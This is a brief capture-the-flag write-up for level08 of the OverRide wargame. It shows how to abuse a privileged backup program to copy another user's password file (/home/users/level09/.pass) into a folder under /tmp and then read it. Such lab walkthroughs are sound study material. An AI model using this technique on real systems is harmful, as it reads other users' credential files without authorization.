The program reads a file path given through the arguments, it then copies it into the ./backup folder.
We want to pass /home/users/level09/.pass to it.
We simply have to go to /tmp to have read and write permissions, create the folder /home/users/level09 and run the file with `~/level08 /home/users/level09/.pass`.

level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
